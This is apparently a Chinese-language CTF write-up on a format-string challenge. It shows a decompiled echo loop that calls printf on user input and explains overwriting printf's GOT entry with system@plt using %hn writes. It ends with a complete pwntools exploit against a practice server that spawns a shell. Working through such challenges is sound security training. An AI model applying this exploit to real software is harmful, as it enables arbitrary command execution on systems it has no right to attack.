pwn-WP-格式化字符串
Ev3r

一个简单的hijack got利用的是格式化字符出漏洞。

格式化字符串使用还不是很熟练，总感觉原理简单，但是用起来就特别难受。还是要多写几次格式化字符串的payload

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-10Ch]
  unsigned int v4; // [esp+10Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  do
  {
    fgets(&s, 256, stdin);
    printf(&s);
  }
  while ( strcmp(&s, "exit\n") );
  system("echo Goodbye");
  exit(0);
}

可以无限次利用的格式化字符串，想到修改printf为system，这样的话，再传入/bin/sh就拿到shell了。

printfgot->system_plt

首先试出来是exit\n\x00AAA是第八个参数，所以第九个参数开始就是我们的格式化字符串可以修改的位置（这里没算上格式化字符串）算上之后是第10个参数。

看了师傅的wp发现，我好像确实蠢了，这里直接利用一次就可以了，没必要绕过strcmp循环比较，所以的话，直接第七个参数就是我们的格式化字符串。

然后大概payload如下

payload = printf_got + (printfgot+1) + (printfgot+2) + (printfgot+3) + padding + '%7$hhn'
payload += padding + '%8$hhn'
paylaod += padding + '%9$hhn' + padding + '%10$hhn'

当然这只是推测实际上要根据printfgot不同字节的大小确定改动的顺序。

值得注意的是padding + '%7$hhn'到padding + '%8$hhn之间增加的是padding而不算格式化字符串。

所以有了如下exp

from pwn import *

#p = process('./echo')
p = remote('node3.buuoj.cn',"27473")
sys_plt = 0x08048400
elf = ELF('./echo')
printfgot = elf.got["printf"]

payload = p32(printfgot) + p32(printfgot+2) + "%2044c" + "%8$hn" + "%31740c" + "%7$hn"
p.sendline(payload)
p.recvuntil('\n')


p.sendline("/bin/sh\x00")
p.interactive()
